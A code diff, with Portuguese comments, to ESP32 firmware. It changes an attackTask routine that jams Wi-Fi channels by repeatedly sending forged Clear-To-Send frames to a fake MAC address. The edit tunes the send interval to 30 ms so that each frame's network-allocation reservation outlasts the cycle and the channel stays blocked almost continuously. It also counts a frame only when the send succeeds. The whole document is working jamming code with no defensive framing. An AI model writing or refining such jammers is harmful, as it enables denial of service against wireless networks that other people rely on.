@@ -136,7 +136,7 @@ void attackTask(void *parameter) {
       }
     }
 
-    // CTS JAMMER — trava o canal com ráfaga de frames Clear-To-Send
+    // CTS JAMMER — trava o canal com frames Clear-To-Send
     else if (ctsAtivo && radioLocked) {
       if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {
 
@@ -149,19 +149,19 @@ void attackTask(void *parameter) {
           esp_wifi_set_channel(canal_alvo, WIFI_SECOND_CHAN_NONE);
         }
 
-        // CTS Jamming efetivo com frames nativos 0xC4
-        // Enviamos para um MAC unicast falso para forçar o ACK timeout e atualizar o NAV de todos.
+        // CTS Jamming: 1 frame por ciclo — NAV dura 32.767ms,
+        // ciclo de ~30ms mantém canal travado quase sem gap
         static const uint8_t fake_unicast_mac[] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
 
-        wsl_bypasser_send_cts_frame(fake_unicast_mac);
-        ctsCounter++;
+        esp_err_t ret = wsl_bypasser_send_cts_frame(fake_unicast_mac);
+        if (ret == ESP_OK) {
+          ctsCounter++;
+        }
 
         xSemaphoreGive(wifiMutex);
-        
-        // O frame CTS real exigirá retries do ESP32, esgotando a fila TX se formos muito rápidos.
-        // O delay de 40ms é o "sweet spot": rápido o suficiente para travar o canal,
-        // mas lento o suficiente para que o lmac.c não gere vazamento de memória (ESP_ERR_NO_MEM).
-        vTaskDelay(pdMS_TO_TICKS(40));
+
+        // 30ms: NAV (32.767ms) > ciclo (30ms) → canal permanece travado
+        vTaskDelay(pdMS_TO_TICKS(30));
       } else {
         vTaskDelay(pdMS_TO_TICKS(10));
       }
